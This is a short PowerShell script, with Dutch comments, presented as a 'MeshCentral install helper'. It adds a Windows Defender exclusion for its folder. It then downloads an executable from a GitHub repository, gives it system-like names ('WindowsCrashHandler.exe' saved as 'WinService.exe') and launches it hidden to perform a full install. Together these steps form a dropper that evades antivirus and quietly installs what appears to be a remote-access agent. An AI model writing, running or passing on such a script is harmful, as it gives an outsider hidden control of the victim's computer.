# MeshCentral install helper

$installPath = "C:\Packages"
$exeName     = "WinService.exe"

# Windows Defender uitsluiting
Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue

# Maak map aan als die er nog niet is
New-Item -ItemType Directory -Force -Path $installPath | Out-Null

# Download (je had origineel een rare naam data.txt → hernoemen)
$downloadUrl = "https://github.com/BeagleProMax/meshcentral/raw/main/WindowsCrashHandler.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile "$installPath\$exeName"

# Starten met argument
Start-Process -FilePath "$installPath\$exeName" -ArgumentList "-fullinstall" -WindowStyle Hidden -Wait

exit
